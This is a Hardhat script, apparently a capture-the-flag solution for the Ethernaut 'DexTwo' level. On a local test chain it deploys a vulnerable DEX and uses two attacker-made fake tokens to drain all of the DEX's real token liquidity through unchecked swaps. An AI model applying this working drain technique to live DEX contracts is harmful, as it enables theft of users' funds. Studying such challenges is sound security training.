/*

*/

const hre = require("hardhat");
const { expect } = require("chai")

async function main() {
  // Recreating the attack on ganache
  [player,deployer,user] = await ethers.getSigners();
  
  //Fund the player account - Execute it only the first time the script is ran
  await user.sendTransaction({
    to: player.address,
    value: ethers.utils.parseEther("50.0"), // Sends exactly 50.0 ether
  });

  // Get an instance of the contract deployed by Ethernaut
  // const GatekeeperTwo = "0xEe5097bF657e8aFDD0d7bF0f8580cfB2C6d777cF"
  // this.gateKeeperTwo = await hre.ethers.getContractAt("GatekeeperTwo",GatekeeperTwo);

  console.log("Deploying DEX & Tokens Contract");
  // Deploying a new DEX contract
  const DexTwo = await hre.ethers.getContractFactory("DexTwo");
  this.dexTwo = await DexTwo.connect(deployer).deploy();
  await this.dexTwo.deployed();

  // Deploying Token1 contract
  const Token1 = await hre.ethers.getContractFactory("SwappableToken");
  this.token1 = await Token1.connect(deployer).deploy(this.dexTwo.address,"Token1","T1",500);
  await this.token1.deployed();

  // Deploying Token2 contract
  const Token2 = await hre.ethers.getContractFactory("SwappableToken");
  this.token2 = await Token2.connect(deployer).deploy(this.dexTwo.address,"Token2","T2",500);
  await this.token2.deployed();

  console.log("Setting up token's balances and required allowances");
  // Setting up the token's balances!
  // Token's owner grants the DEX contract the required allowance to add 100 tokens1 as liquidity
  let tx = await this.token1.connect(deployer).increaseAllowance(this.dexTwo.address,100);
  await tx.wait();

  // Token's owner grants the DEX contract the required allowance to add 100 tokens2 as liquidity
  tx = await this.token2.connect(deployer).increaseAllowance(this.dexTwo.address,100);
  await tx.wait();

  // Adding 100 tokens of each token as liquidity on the DEX Contract
  tx = await this.dexTwo.connect(deployer).add_liquidity(this.token1.address,100);
  await tx.wait();
  tx = await this.dexTwo.connect(deployer).add_liquidity(this.token2.address,100);
  await tx.wait();

  // Setting the tokens addresses on the DEX Contract
  tx = await this.dexTwo.connect(deployer).setTokens(this.token1.address,this.token2.address);
  await tx.wait();

  // Funding the player's account with 10 tokens each
  tx = await this.token1.connect(deployer).transfer(player.address,10);
  await tx.wait();

  tx = await this.token2.connect(deployer).transfer(player.address,10);
  await tx.wait();

  // Validate all the configurations on the DEX Contract were made properly before proceeding to deploy the Attacker contract
  expect(await this.token1.address).to.eq(await this.dexTwo.token1());
  expect(await this.token2.address).to.eq(await this.dexTwo.token2());

  expect(await this.dexTwo.balanceOf(this.token1.address,this.dexTwo.address)).to.eq(100);
  expect(await this.dexTwo.balanceOf(this.token2.address,this.dexTwo.address)).to.eq(100);

  // Validate the player has been funded with 10 tokens each
  expect(await this.token1.balanceOf(player.address)).to.eq(10);
  expect(await this.token2.balanceOf(player.address)).to.eq(10);
  
  console.log("\n\n Performing attack ... \n");
  console.log("Deploying the two fake tokens");
  // Deploying TokenFake1 contract
  const TokenFake1 = await hre.ethers.getContractFactory("SwappableToken");
  this.tokenFake1 = await TokenFake1.connect(player).deploy(this.dexTwo.address,"TokenFake1","TF1",1000);
  await this.tokenFake1.deployed();

  // Deploying TokenFake2 contract
  const TokenFake2 = await hre.ethers.getContractFactory("SwappableToken");
  this.tokenFake2 = await TokenFake2.connect(player).deploy(this.dexTwo.address,"TokenFake2","TF2",1000);
  await this.tokenFake2.deployed();

  // Transfer the 10 tokens of the FakeTokens to the DEX Contract
  console.log("Adding the required liquidity into the DEX Contract to perform the attack");
  tx = await this.tokenFake1.connect(player).transfer(this.dexTwo.address,10);
  await tx.wait();

  tx = await this.tokenFake2.connect(player).transfer(this.dexTwo.address,10);
  await tx.wait();

  // At this point, the DexTwo contract has 1000 tokens of liquidity of each fake token
  // By doing the math, this liquidity is enough to drain all the 100 tokens of the good tokens by swapping only 10 of the good ones
  // (amount * balanceToToken) / balanceFromToken ====> (10 * 100) / 10 = 100
  // Where fromToken is the fakeToken & toToken is the real token!

  // Granting allowance to DexTwo contract to spend the fake tokens on behalf of the player
  tx = await this.tokenFake1.connect(player).increaseAllowance(this.dexTwo.address,10);
  await tx.wait();

  tx = await this.tokenFake2.connect(player).increaseAllowance(this.dexTwo.address,10);
  await tx.wait();

  expect(await this.dexTwo.balanceOf(this.tokenFake1.address,this.dexTwo.address)).to.eq(10);
  expect(await this.dexTwo.balanceOf(this.tokenFake2.address,this.dexTwo.address)).to.eq(10);

  expect(await this.tokenFake1.allowance(player.address,this.dexTwo.address)).to.eq(10);
  expect(await this.tokenFake2.allowance(player.address,this.dexTwo.address)).to.eq(10);


  console.log("\n===============================================\n===============================================\n");
  console.log("\n Swapping Fake Tokens for Real Tokens \n");

  console.log("Swapping FakeToken1 for Token2");
  let swapTX = await this.dexTwo.connect(player).swap(this.tokenFake1.address,this.token2.address,10);
  await swapTX.wait();

  console.log("Swapping FakeToken2 for Token1");
  swapTX = await this.dexTwo.connect(player).swap(this.tokenFake2.address,this.token1.address,10);
  await swapTX.wait();


  console.log("\n===============================================\n===============================================\n");
  console.log("\n\n Results after performing the attack \n");

  let dexToken1Balance = await this.dexTwo.balanceOf(this.token1.address,this.dexTwo.address)
  let dexToken2Balance = await this.dexTwo.balanceOf(this.token2.address,this.dexTwo.address)

  console.log(
    `
    Dex contract token1 balance: ${dexToken1Balance} \n
    Dex contract token2 balance: ${dexToken2Balance} \n

    Player token1 balance: ${await this.dexTwo.balanceOf(this.token1.address,player.address)} \n
    Player token2 balance: ${await this.dexTwo.balanceOf(this.token2.address,player.address)} \n
    `
  );

  if( dexToken1Balance > 0) throw new TypeError('The DEX Contract has still balance of Token1');
  if( dexToken2Balance > 0) throw new TypeError('The DEX Contract has still balance of Token2');

  console.log("\n\n ========================== Attack Completed!!!! ==========================");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});